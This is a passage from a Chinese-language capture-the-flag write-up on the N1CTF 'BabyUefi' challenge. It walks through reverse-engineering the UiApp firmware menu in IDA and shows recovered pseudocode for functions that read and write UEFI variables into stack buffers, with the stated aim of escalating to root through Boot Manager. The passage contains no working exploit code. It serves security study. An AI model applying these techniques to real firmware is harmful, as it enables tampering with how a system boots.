id</span></span><br><span class="line"><span class="string">uid=1000 gid=1000 groups=1000</span></span><br></pre></td></tr></table></figure><p>当我们启动 run.py 的时候按 F12，这个时候我们就会进入到一个菜单界面：  </p><img src="/2025/01/06/uefi2/1.png" class="" title="我的图图呢">  <p>不能猜到漏洞就在这一个菜单界面中，我们需要通过漏洞来将权限提升至 root 然后获取 flag。也就是说我们的目标就是通过对漏洞的利用来打开 Boot Manager，并加入自己的启动项使用 root 启动系统读出 flag。  </p><p>具体固件的提取过程见我的上一篇文章<a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>，通过字符串的搜索我们能很容易的定位到这个菜单界面是由固件 UiApp 实现的。我们将其拖进 ida 中会发现其非常难看，符号表全去掉了，而且有很多函数的参数并没有给识别出来，如下（下面这个函数已经恢复了部分符号）：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  __int16 v8[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(v2);</span><br><span class="line">  Input(v3, v6);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v9, v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(v4);</span><br><span class="line">  Input(v5, v7);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           v8,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           v10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 Output 和 Input 的函数参数并没有给正确的识别，然后我去看这个函数的汇编寻找原因。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001CA1 Add             proc near               ; CODE XREF: vuln+CB↓p</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1 var_140         = qword ptr -140h</span><br><span class="line">.text:0000000000001CA1 var_130         = word ptr -130h</span><br><span class="line">.text:0000000000001CA1 var_110         = byte ptr -110h</span><br><span class="line">.text:0000000000001CA1 var_100         = byte ptr -100h</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1                 endbr64</span><br><span class="line">.text:0000000000001CA5                 push    rbp</span><br><span class="line">.text:0000000000001CA6                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001CA9                 sub     rsp, 160h</span><br><span class="line">.text:0000000000001CB0                 lea     rdi, aKeyName   ; &quot;Key name:&quot;</span><br><span class="line">.text:0000000000001CB7                 call    Output</span><br><span class="line">.text:0000000000001CBC                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CC3                 mov     esi, 10h        ; unsigned int</span><br><span class="line">.text:0000000000001CC8                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001CCB                 call    Input</span><br><span class="line">.text:0000000000001CD0                 lea     rdx, [rbp+var_130]</span><br><span class="line">.text:0000000000001CD7                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CDE                 mov     r8d, 10h</span><br><span class="line">.text:0000000000001CE4                 mov     rcx, rax</span><br><span class="line">.text:0000000000001CE7                 call    Str2Unicode</span><br><span class="line">.text:0000000000001CEC                 lea     rdi, aKeyValue  ; &quot;Key value:&quot;</span><br><span class="line">.text:0000000000001CF3                 call    Output</span><br><span class="line">.text:0000000000001CF8                 lea     rax, [rbp+var_100]</span><br><span class="line">.text:0000000000001CFF                 mov     esi, 100h       ; unsigned int</span><br><span class="line">.text:0000000000001D04                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001D07                 call    Input</span><br><span class="line">.text:0000000000001D0C                 mov     rax, cs:gRT</span><br><span class="line">.text:0000000000001D13                 mov     rsi, [rax+58h]</span><br><span class="line">.text:0000000000001D17                 lea     rax, [rbp+var_130]</span><br><span class="line">.text:0000000000001D1E                 lea     rdx, [rbp+var_100]</span><br><span class="line">.text:0000000000001D25                 mov     [rsp+160h+var_140], rdx</span><br><span class="line">.text:0000000000001D2A                 mov     r9d, 100h</span><br><span class="line">.text:0000000000001D30                 mov     r8d, 7</span><br><span class="line">.text:0000000000001D36                 lea     rdx, GUID</span><br><span class="line">.text:0000000000001D3D                 mov     rcx, rax</span><br><span class="line">.text:0000000000001D40                 call    rsi</span><br><span class="line">.text:0000000000001D42                 leave</span><br><span class="line">.text:0000000000001D43                 retn</span><br><span class="line">.text:0000000000001D43 Add             endp</span><br></pre></td></tr></table></figure><p>发现 Input 和 Output 的函数传参规则是和我们平时 linux 中的一样（rdi、rsi、rdx、r8、r9），而 gRT 上的函数则是 rcx、rdx、r8、r9<br>所以这里我们要在 ida 上手动恢复其传参规则，这里的修改方式读者请自行网上搜索，这里给出我修改 Output 函数的 demo  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __usercall <span class="title function_">Output</span><span class="params">(<span class="type">char</span> *@&lt;rdi&gt;)</span></span><br></pre></td></tr></table></figure><p>通过对 edk2 源码的阅读，我恢复了大部分的结构体结构，下面给出我恢复符号后的 ida 伪代码。</p><h3 id="恢复了部分符号的IDA伪代码"><a href="#恢复了部分符号的IDA伪代码" class="headerlink" title="恢复了部分符号的IDA伪代码"></a>恢复了部分符号的IDA伪代码</h3><h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !byte_352B0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F250,</span><br><span class="line">           &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v4 = <span class="number">0</span>i64;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F240,</span><br><span class="line">           &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_352B4 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">4</span>i64);</span><br><span class="line">      dword_352B8 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">8</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64 *, __int64 *))(v3 + <span class="number">24</span>))(</span><br><span class="line">             v3,</span><br><span class="line">             *(<span class="type">int</span> *)(*(_QWORD *)(v3 + <span class="number">72</span>) + <span class="number">4</span>i64),</span><br><span class="line">             &amp;v2,</span><br><span class="line">             &amp;v1);</span><br><span class="line">      dword_352BC = v2;</span><br><span class="line">      dword_352C0 = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_352CC = sub_42ED(<span class="number">35</span>i64);</span><br><span class="line">    dword_352D0 = sub_42ED(<span class="number">36</span>i64);</span><br><span class="line">    dword_352C4 = dword_2F420;</span><br><span class="line">    dword_352C8 = dword_2F424;</span><br><span class="line">    byte_352B0 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))gBS-&gt;SetWatchdogTimer)(<span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  v5 = sub_268F();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_935C() &amp;&amp; !v5 )</span><br><span class="line">    sub_92B3(</span><br><span class="line">      (__int64)<span class="string">&quot;/home/parallels/macOS/Desktop/edk2/edk2/MdeModulePkg/Application/UiApp/FrontPage.c&quot;</span>,</span><br><span class="line">      <span class="number">1155</span>i64,</span><br><span class="line">      (__int64)<span class="string">&quot;HiiHandle != ((void *) 0)&quot;</span>);</span><br><span class="line">  sub_25E0();</span><br><span class="line">  sub_11A4();</span><br><span class="line">  <span class="keyword">if</span> ( vuln() )</span><br><span class="line">  &#123;</span><br><span class="line">    Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_23A4(<span class="number">0</span>);</span><br><span class="line">    sub_11A4();</span><br><span class="line">    sub_2645();</span><br><span class="line">    sub_C6B3(v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY1&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;BabyUefi&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY3&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;mr.rtcl!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          Add(v0);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        Delete(v0);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Get(v0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Encode(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Add"><a href="#Add" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(<span class="string">&quot;Key value:&quot;</span>);</span><br><span class="line">  Input(Data, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Delete</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, _QWORD, _QWORD, _QWORD))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Get</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+30h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+3Ch] [rbp-134h] BYREF</span></span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+70h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v4, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v4, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    VariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data);</span><br><span class="line">  Output(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">  Output(Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 GetVariableName[<span class="number">2</span>]; <span class="comment">// [rsp+3Ah] [rbp-166h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4Ah] [rbp-156h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+4Eh] [rbp-152h]</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+50h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+5Ch] [rbp-144h] BYREF</span></span><br><span class="line">  __int16 SetVariableName[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">16</span>]; <span class="comment">// [rsp+80h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data_1[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 Data_2; <span class="comment">// [rsp+190h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  GetVariableName[<span class="number">0</span>] = <span class="string">&#x27;T\0C\01\0N&#x27;</span>;</span><br><span class="line">  GetVariableName[<span class="number">1</span>] = <span class="string">&#x27;E\0K\0_\0F&#x27;</span>;</span><br><span class="line">  v3 = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v8, SetVariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    SetVariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data_1);</span><br><span class="line">  DataSize = <span class="number">8</span>i64;</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(Data_1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; i += <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    HIWORD(v3) = i / <span class="number">8</span> % <span class="number">3</span> + <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(__int64 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, __int64 *))gRT-&gt;GetVariable)(</span><br><span class="line">      GetVariableName,</span><br><span class="line">      &amp;GUID,</span><br><span class="line">      Attributes,</span><br><span class="line">      &amp;DataSize,</span><br><span class="line">      &amp;Data_2);</span><br><span class="line">    *(_QWORD *)&amp;Data_1[i] ^= Data_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           SetVariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IDA中添加的结构体"><a href="#IDA中添加的结构体" class="headerlink" title="IDA中添加的结构体"></a>IDA中添加的结构体</h3><p>这里给出我在 IDA 